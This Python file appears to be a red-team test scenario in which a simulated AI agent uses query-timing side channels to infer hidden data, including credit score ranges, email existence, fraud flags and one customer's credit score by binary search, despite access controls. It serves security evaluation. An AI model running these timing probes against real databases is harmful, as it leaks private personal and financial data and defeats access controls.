"""
Scenario 5: Timing Side-Channel Attacks

Simulates an AI agent inferring the existence or distribution of
sensitive data by measuring query response times.  Even when direct
access is blocked, an agent can learn whether certain records exist
by observing latency differences for filtered queries.

Pressure point from SAO paper: "efficient support for semantic
probing" — agents can use timing oracles even against access controls.
"""

from __future__ import annotations

import time
import statistics
from scenarios.base import BaseScenario, ScenarioResult, AttackProbe


class SideChannelScenario(BaseScenario):
    name = "side_channel"
    description = (
        "Agent uses timing differences to infer sensitive data existence: "
        "credit score ranges, fraud flags, PII presence, and record counts "
        "without directly reading the values."
    )

    def _time_query(self, client, query: str, iterations: int = 5) -> list[float]:
        """Run a query multiple times and return latencies in ms."""
        latencies = []
        for _ in range(iterations):
            t0 = time.perf_counter()
            try:
                client.query(query)
            except Exception:
                pass
            latencies.append((time.perf_counter() - t0) * 1000)
        return latencies

    def run(self) -> ScenarioResult:
        client = self.get_client()
        t0 = time.perf_counter()
        probes: list[AttackProbe] = []
        timing_results = {}

        # --- Probe 1: Credit score range inference ---
        # Compare timing for queries filtering on different credit score ranges
        # to infer data distribution without seeing actual values

        for label, low, high in [
            ("credit_very_high", 800, 850),
            ("credit_medium", 600, 700),
            ("credit_low", 300, 400),
        ]:
            query = f"""
                SELECT count() FROM sao.customers_distributed
                WHERE credit_score BETWEEN {low} AND {high}
            """
            latencies = self._time_query(client, query)
            avg_lat = statistics.mean(latencies)
            timing_results[label] = avg_lat

            probes.append(AttackProbe(
                name=f"timing_{label}",
                query=query,
                succeeded=True,
                latency_ms=avg_lat,
                metadata={"latencies_ms": [round(l, 2) for l in latencies]},
            ))

        # --- Probe 2: Customer existence oracle ---
        # Time queries for specific email patterns to detect existence

        for label, pattern in [
            ("email_exists_gmail", "%gmail.com"),
            ("email_exists_company", "%company.com"),
            ("email_nonexistent", "%zzzznotreal.xyz"),
        ]:
            query = f"""
                SELECT count() FROM sao.customers_distributed
                WHERE email LIKE '{pattern}'
            """
            latencies = self._time_query(client, query)
            avg_lat = statistics.mean(latencies)
            timing_results[label] = avg_lat

            probes.append(AttackProbe(
                name=f"timing_{label}",
                query=query,
                succeeded=True,
                latency_ms=avg_lat,
                metadata={"latencies_ms": [round(l, 2) for l in latencies]},
            ))

        # --- Probe 3: Fraud record detection ---
        # Infer whether high-fraud-score records exist by timing

        for label, threshold in [
            ("fraud_very_high", 0.99),
            ("fraud_medium", 0.5),
            ("fraud_none", 1.1),  # impossible value — baseline
        ]:
            query = f"""
                SELECT count() FROM sao.transactions_distributed
                WHERE fraud_score > {threshold}
            """
            latencies = self._time_query(client, query)
            avg_lat = statistics.mean(latencies)
            timing_results[label] = avg_lat

            probes.append(AttackProbe(
                name=f"timing_{label}",
                query=query,
                succeeded=True,
                latency_ms=avg_lat,
                metadata={"latencies_ms": [round(l, 2) for l in latencies]},
            ))

        # --- Probe 4: Binary search for individual records ---
        # Progressively narrow down a customer's credit score via COUNT timing

        binary_search_queries = []
        # Simulate binary search: is there a customer_id=42 with credit_score > X?
        for threshold in [500, 700, 750, 775, 788]:
            query = f"""
                SELECT count() FROM sao.customers_distributed
                WHERE customer_id = 42 AND credit_score > {threshold}
            """
            latencies = self._time_query(client, query, iterations=3)
            avg_lat = statistics.mean(latencies)
            binary_search_queries.append((threshold, avg_lat))

            probes.append(AttackProbe(
                name=f"timing_bsearch_gt_{threshold}",
                query=query,
                succeeded=True,
                latency_ms=avg_lat,
                metadata={
                    "threshold": threshold,
                    "latencies_ms": [round(l, 2) for l in latencies],
                },
            ))

        # Compute timing variance — high variance suggests data-dependent branching
        all_latencies = [v for v in timing_results.values()]
        timing_variance = statistics.variance(all_latencies) if len(all_latencies) > 1 else 0

        return ScenarioResult(
            scenario_name=self.name,
            description=self.description,
            probes=probes,
            total_time_s=time.perf_counter() - t0,
            metadata={
                "timing_results": {k: round(v, 2) for k, v in timing_results.items()},
                "timing_variance_ms2": round(timing_variance, 4),
                "binary_search_profile": [
                    {"threshold": t, "avg_ms": round(l, 2)}
                    for t, l in binary_search_queries
                ],
            },
        )
